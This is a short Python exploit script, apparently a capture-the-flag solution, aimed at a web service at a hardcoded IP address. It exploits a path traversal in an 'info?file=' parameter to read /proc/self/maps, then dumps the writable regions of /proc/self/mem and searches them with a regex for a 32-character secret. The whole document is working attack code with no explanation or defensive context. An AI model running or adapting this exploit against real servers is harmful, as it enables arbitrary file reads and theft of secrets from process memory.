import requests, re
 
url = "http://61.147.171.105:63286/"
maps_url = f"{url}/info?file=../../proc/self/maps"
maps_reg = "([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0"
maps = re.findall(maps_reg, requests.get(maps_url).text)
#print(maps)
for m in maps:
    start, end = m.split("-")[0], m.split("-")[1]
    start, end = str(int(start, 16)), str(int(end, 16))
    read_url = f"{url}/info?file=../../proc/self/mem&start={start}&end={end}"
    s = requests.get(read_url).content
    rt = re.findall(b"[a-z0-9]{32}\*abcdefgh", s)
    if rt:
        print(rt, start, end)